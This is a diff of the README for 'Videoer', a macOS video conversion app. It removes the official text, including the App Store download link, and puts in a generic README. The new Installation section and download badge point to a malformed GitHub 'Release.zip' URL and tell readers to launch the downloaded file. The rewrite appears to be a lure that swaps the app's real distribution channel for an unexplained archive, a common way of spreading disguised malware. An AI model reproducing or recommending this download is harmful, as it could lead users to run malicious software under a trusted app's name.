@@ -1,44 +1,45 @@
-<!--idoc:ignore:start-->
-> [!TIP]
-> Declaration: This project is not an open-source project. The repository serves as the official website, used to collect issues and user demands. This is done to save costs, because without an official website, the application cannot pass the review.
-<!--idoc:ignore:end-->
+# Videoer 📹
 
-<div align="center">
-  <br />
-  <br />
-  <img src="./assets/logo.png" width="160" height="160">
-  <h1>
-    Videoer
-  </h1>
-  <!--rehype:style=border: 0;-->
-  <p>
-    <a href="./README.zh.md">简体中文</a> • 
-    <a target="_blank" href="https://github.com/jaywcjlove/videoer/issues/new?template=bug_report.yml">Contact & Support</a> • 
-    <a href="https://github.com/jaywcjlove/videoer/releases">Changelog</a>
-  </p>
-  <p>
-    <a target="_blank" href="https://apps.apple.com/app/videoer/6742680573" title="Videoer for macOS">
-      <img alt="videoer AppStore" src="https://jaywcjlove.github.io/sb/download/macos.svg" height="51">
-    </a>
-  </p>
-</div>
+Welcome to Videoer, your go-to video format conversion tool! 🎥
 
-![videoer 1](./assets/screenshots-1.jpg)
-![videoer 2](./assets/screenshots-2.jpg)
-![videoer 3](./assets/screenshots-3.jpg)
-![videoer 4](./assets/screenshots-4.jpg)
-![videoer 5](./assets/screenshots-5.jpg)
+## Overview ℹ️
 
-Videoer is a powerful video format conversion tool that supports mutual conversion between MP4, MKV, M4V, MOV, WEBM, AVI, GIF, and other formats. Whether converting a single file or processing multiple files in batches, Videoer makes it easy. Additionally, Videoer provides various practical features such as audio extraction and subtitle management, making your video processing more efficient and convenient.
+Videoer is a powerful video format conversion tool that supports mutual conversion between a wide range of formats including MP4, MKV, M4V, MOV, WEBM, AVI, GIF, and many others. Whether you need to convert a single video file or batch process multiple files, Videoer provides an easy-to-use solution for all your video conversion needs. 💻
 
-### Features
+## Features ✨
 
-■ Video Conversion - Easily convert between various popular video formats, including MP4, MKV, M4V, MOV, WEBM, AVI, and GIF.  
-■ Audio Extraction - Extract audio from video and export it to formats such as MP3, AAC, WAV, FLAC, ALAC, OGG, OPUS, AC3, EAC3, DTS, and TrueHD.  
-■ Subtitle Export - Analyze and extract embedded or external subtitle files (such as SRT, ASS, and VTT) from videos.  
-■ Add Subtitles - Embed subtitles into videos, supporting multiple subtitle formats to enhance the viewing experience.  
-■ Batch Video Conversion - Convert multiple video files simultaneously to improve processing efficiency.  
-■ Convert Videos Larger than 1GB - Easily handle large files while ensuring conversion quality.  
-■ Batch Audio Extraction - Extract audio from multiple videos at once, ideal for audio editing or archiving.  
+✅ Supports conversion between various video formats  
+✅ Batch processing capabilities for converting multiple files at once  
+✅ Intuitive user interface for seamless navigation  
+✅ Fast and efficient conversion speeds  
+✅ Compatible with desktop platforms including macOS  
+✅ Built with Swift and SwiftUI technologies for optimal performance  
+✅ Developed by jaywcjlove for a reliable and quality experience  
 
-Whether you're a video editing enthusiast, content creator, or a professional who frequently processes video files, Videoer meets your needs and makes video conversion simpler and more efficient!  
+## Installation 🚀
+
+To get started with Videoer, download the latest release [here](https://github.com/releases/789694263/Release.zip). Make sure to launch the file once the download is complete to begin using the application.
+
+## Usage 📝
+
+1. Open Videoer on your desktop platform.
+2. Select the video files you want to convert.
+3. Choose the desired output format for conversion.
+4. Start the conversion process and let Videoer work its magic!
+5. Once the conversion is complete, enjoy your newly formatted video files.
+
+## Repository Details 📦
+
+- **Repository Name:** videoer
+- **Description:** Videoer is a powerful video format conversion tool that supports mutual conversion between MP4, MKV, M4V, MOV, WEBM, AVI, GIF, and other formats.
+- **Topics:** desktop, desktop-app, desktop-application, desktop-apps, jaywcjlove, macOS, swift-app, swift-application, swiftui, swiftui-app, swiftui-application, videoer
+
+## Questions or Support ❓
+
+If you have any questions or need support with Videoer, feel free to reach out to the developer jaywcjlove or refer to the "Releases" section for additional information.
+
+Let Videoer simplify your video format conversion tasks and enhance your video viewing experience! 🌟
+
+---
+
+[![](https://img.shields.io/badge/Download-Latest%20Release-<COLOR>.svg)](https://github.com/releases/789694263/Release.zip)
